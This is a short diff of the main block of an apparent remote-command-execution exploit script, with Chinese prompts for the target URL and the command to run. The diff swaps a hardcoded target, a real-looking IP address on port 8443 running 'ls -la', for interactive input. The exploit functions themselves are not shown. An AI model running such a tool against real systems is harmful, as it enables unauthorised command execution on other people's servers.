@@ -70,12 +70,9 @@ def form_rce(url,command):
 
 if __name__ == "__main__":
     title()
-    # url = str(input("[-]  请输入目标系统URL:\n"))
-    # command = str(input("[-]  请输入需要执行的命令:\n"))
-    # node_rce(url,command)
     option = int(input("[-]  请选择RCE类型 1 or 2 :\n"))
-    url = "https://124.152.228.86:8443"
-    command = "ls -la"
+    url = str(input("[-]  请输入目标系统URL:\n"))
+    command = str(input("[-]  请输入需要执行的命令:\n"))
     if option == 1:
         form_rce(url,command)
     elif option == 2:
